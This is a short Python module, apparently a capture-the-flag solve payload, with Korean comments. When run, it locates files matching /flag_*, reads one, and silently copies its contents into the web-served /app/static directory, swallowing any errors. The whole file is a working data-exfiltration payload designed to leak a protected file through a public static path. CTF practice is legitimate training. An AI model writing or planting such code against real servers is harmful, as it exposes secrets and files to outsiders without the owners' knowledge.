# nspacercesolve/__main__.py

import glob
from pathlib import Path


def main():
    # 1) /flag_* 파일 찾기
    paths = glob.glob("/flag_*")
    if not paths:
        return

    # 2) 플래그 파일 내용 읽기
    try:
        with open(paths[0], "r") as f:
            flag_text = f.read()
    except Exception as e:
        flag_text = f"ERR: {e}"

    # 3) /app/static/flag.txt 에 플래그 쓰기
    try:
        static_dir = Path("/app") / "static"
        static_dir.mkdir(parents=True, exist_ok=True)

        flag_path = static_dir / "flag.txt"
        flag_path.write_text(flag_text)
    except Exception:
        # 실패해도 조용히 무시
        pass


if __name__ == "__main__":
    main()